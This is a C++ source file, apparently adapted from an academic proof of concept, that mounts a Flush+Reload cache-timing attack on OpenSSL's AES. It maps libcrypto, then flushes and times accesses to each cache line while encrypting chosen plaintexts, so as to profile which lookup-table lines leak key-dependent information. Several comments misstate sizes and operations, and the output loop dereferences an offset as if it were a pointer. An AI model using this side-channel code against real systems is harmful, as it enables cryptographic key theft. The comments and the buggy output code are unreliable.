#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (210)//calibration make and run

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (100)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

int main()
{
  int fd = open("/lib/x86_64-linux-gnu/libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);//move to file end.
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)//0xFFF hava 12 "1"=4M.
  {
    map_size |= 0xFFF;//keep bit "head~13".. change "12-1" to "1".
    map_size += 1;//map_size=8M.
  }// in this way,change map_size >=8M.
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);//return the maped area pointer=base.
  end = base + size;
  printf("base= %d size=0x%0x end=%d \n",base,size,end);

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  // unsigned char restoredtext[128];// not used

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)//16:plaintext[0] lower 4 bits->"10000".
  {
    plaintext[0] = byte;//byte=16,32,48,,upper 4 bits varies->0,0x10,0x100,0x110...
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    for (probe = base; probe < end; probe += 64)//in aes,every block is 64 bits..block ^ key.
    {
      size_t count = 0;
      int first_ret = sched_yield();
      if(first_ret == -1){
        printf("first sched_yield() failed\n");
      }
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        for (size_t j = 0; j < 16; ++j){//plaintext has 16 element.
          plaintext[j] = rand() % 256;//plaintext:0~255.becasue plaintext has 8 bits.
        }
        flush(probe);
        plaintext[0] |= 0xF;//reverse uppper 4 bits..change lower 4 bits->"1111".
        AES_encrypt(plaintext, ciphertext, &key_struct);
        size_t time = rdtsc();
        maccess(probe);//mov *probe ,rax
        size_t delta = rdtsc() - time;
        if (delta < MIN_CACHE_MISS_CYCLES)
          ++count;
      }
      int second_ret = sched_yield();
      if(second_ret == -1){
        printf("second sched_yield() failed\n");
      }
      timings[probe][byte] = count;
      int third_ret = sched_yield();
      if(third_ret == -1){
        printf("third sched_yield() failed\n");
      }
    }
  }

  int addr_val_in_map,count_val_in_map;
  for (auto ait : timings){
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second){
      count_val_in_map=kit.second;

      if(count_val_in_map != 0){
          addr_val_in_map=*(ait.first - base);
          printf(",found count= %lu, addr_val=0x%0x",
            count_val_in_map,addr_val_in_map);
      }else{
        printf(",%lu", count_val_in_map);
      }
      
    }
    
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

